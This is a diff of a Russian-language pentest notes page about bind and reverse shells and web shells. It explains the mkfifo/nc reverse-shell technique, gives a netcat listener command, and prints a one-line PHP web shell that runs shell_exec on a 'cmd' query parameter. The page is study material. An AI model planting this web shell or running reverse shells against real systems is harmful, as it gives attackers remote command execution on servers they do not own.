@@ -961,13 +961,6 @@
   
 </li>
       
-        <li class="md-nav__item">
-  <a href="#web-shells" class="md-nav__link">
-    web shells
-  </a>
-  
-</li>
-      
     </ul>
   
 </nav>
@@ -1155,8 +1148,8 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Tools/curl/" class="md-nav__link">
-        curl
+      <a href="../../Tools/Burp_Suite/" class="md-nav__link">
+        Burp suite
       </a>
     </li>
   
@@ -1169,8 +1162,8 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Tools/Burp_Suite/" class="md-nav__link">
-        Burp suite
+      <a href="../../Tools/curl/" class="md-nav__link">
+        curl
       </a>
     </li>
   
@@ -2188,13 +2181,6 @@
   
 </li>
       
-        <li class="md-nav__item">
-  <a href="#web-shells" class="md-nav__link">
-    web shells
-  </a>
-  
-</li>
-      
     </ul>
   
 </nav>
@@ -2212,18 +2198,22 @@
 
 <h1 id="reverse-shell">Reverse shell</h1>
 <hr />
-<p><strong>Shell</strong> - общее название текстового командного интерфейса <strong>(CLI)</strong>.
-Используя такие утилиты как <strong>netcat (nc), socat, Metasploit --multi/handler, Msfvenom</strong> можно, используя специальный код, подключится к удаленной машине или заставить эту машину подключится к машине атакующего.
+<p><strong>Shell</strong> - общее название текстового командного интерфейса (CLI).
+Используя такие утилиты как <code>netcat (nc)</code>, <code>socat</code>, <code>Metasploit --multi/handler</code>, <code>Msfvenom</code> можно, используя специальный код, подключится к удаленной машине или заставить эту машину подключится к машине атакующего.
 В контексте управления через CLI удаленными машинами, различают два типа shell:</p>
 <ol>
-<li><strong>Bind shell</strong> - Оболочка (payload) запускается на машине атакующего и подключается через вышеуказанные утилиты к удаленной машине (listener).</li>
-<li><strong>Reverse shell</strong> - Оболочка (payload) запускается на удаленной машине и отправляет данные на машину атакующего (listener). </li>
+<li>
+<p><strong>Bind shell</strong> - Оболочка (payload) запускается на машине атакующего и подключается через вышеуказанные утилиты к удаленной машине (listener).</p>
+</li>
+<li>
+<p><strong>Reverse shell</strong> - Оболочка (payload) запускается на удаленной машине и отправляет данные на машину атакующего (listener). </p>
+</li>
 </ol>
 <p>Понятно, что reverse shell является предпочтительными вариантом, так по своей природе позволяет обходить inbound правила файрвола.</p>
-<p>Кроме типа подключения, shell можно разделить на <strong>интерактивные</strong> и <strong>неинтерактивные</strong>. Отличаются они друг от друга тем, что в неинтерактивной оболочке, нет возможности взаимодействовать с системой, к примеру нельзя нажать yes или no на задаваемые в процессе работы вопросы.
-Подключения создаваемые по умолчанию через nc являются неинтерактивными и для приведения их к интерактивному виду нужно провести мероприятия по стабилизации оболочки. Подробнее о стабилизации для каждого инструмента написано на странице инструмента.
-В общем случае reverse shell работает следующим образом: 
-на машине жертвы запукается payload для reverse shell представляющий из себя как правило команду которая, например через mkfifo, создает канал в который перенаправляется оболочка (/bin/bash или C:\WINDOWS\System32\cmd.exe). Далее этот канал отдается через nc на адрес и определенный порт на машине атаккующего.<br />
+<p>Кроме типа подключения, shell можно разделить на <strong>интерактивные</strong> и <strong>неинтерактивные</strong>. Отличаются они друг от друга тем, что в неинтерактивной оболочке, нет возможности взаимодействовать с системой, к примеру нельзя нажать yes или no на задаваемые в процессе работы вопросы.</p>
+<p>Подключения создаваемые по умолчанию через nc являются неинтерактивными и для приведения их к интерактивному виду нужно провести мероприятия по стабилизации оболочки. Подробнее о стабилизации для каждого инструмента написано на странице инструмента.</p>
+<p>В общем случае reverse shell работает следующим образом:<br />
+на машине жертвы запукается payload для reverse shell представляющий из себя как правило команду которая, например через <code>mkfifo</code>, создает канал в который перенаправляется оболочка (<code>/bin/bash</code> или <code>C:\WINDOWS\System32\cmd.exe</code>). Далее этот канал отдается через <code>nc</code> на адрес и определенный порт на машине атаккующего.<br />
 на машине жертвы открывается соединение на исходящий порт машины атакующего.
 атакующий слушает этот порт (nc -l[n]vp $PORT) и может посылать команды которые будут выполнятся в переданной оболочке, а их вывод будет также приходить на слушаемый порт. </p>
 <h4 id="payloads-reverse-shell">Примеры Payloads для reverse shell.</h4>
@@ -2239,15 +2229,21 @@ Win powershell:
 <p>Про reverse shell еще написано на страницах о <a href="/CyberSec/Tools/netcat_nc">netcat,</a> <a href="/CyberSec/Tools/socat">socat,</a> msfvenom 
 Различные payloads могут быть найдены на <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">Payloads all the thing,</a> а по адресу <a href="https://www.revshells.com/">https://www.revshells.com/</a> вообще находится целый конструктор.</p>
 <hr />
-<hr />
-<h2 id="web-shells">web shells</h2>
-<p>Скрипт который запускается на web сервере и позволяет выполнять произвольный код.
-Попасть на сервер он может через html форму, или через параметры запроса.
+<h1 id="web-shells">web shells</h1>
+<p>Скрипт который запускается на web сервере и позволяет выполнять произвольный код.<br />
+Попасть на сервер он может через html форму, или через параметры запроса.<br />
 По сути является одним из видов <a href="/CyberSec/CyberSec_Frameworks/OWASP/Injection">инъекций</a>.
-Набор всевозможных web shell есть в kali в директории <a href="file:///home/dirond/docs/content_ivanovds/usr/share/webshells">/usr/share/webshells</a></p>
-<p>В качестве примера простой php скрипт для RCE того кода который был ему передан через параметры:
-<code>&lt;?php echo "&lt;pre&gt;" . shell_exec($_GET["cmd"]) . "&lt;/pre&gt;"; ?&gt;</code>
-использование:  <code>?cmd=&lt;RCE&gt;</code>  </p>
+Набор всевозможных web shell есть в kali в директории <code>/usr/share/webshells</code></p>
+<p>В качестве примера, простой php скрипт для RCE того кода который был ему передан через параметры:
+<div class="language-PHP highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="cp">&lt;?php</span> 
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>    <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span> <span class="o">.</span> 
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>        <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;cmd&quot;</span><span class="p">])</span> <span class="o">.</span> 
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>    <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span> 
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="cp">?&gt;</span>
+</span></code></pre></div>
+использование:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>?cmd=&lt;RCE&gt;
+</span></code></pre></div></p>
 <p>Будет больше пользы если просматривать результаты через source code сайта.</p>
 
 
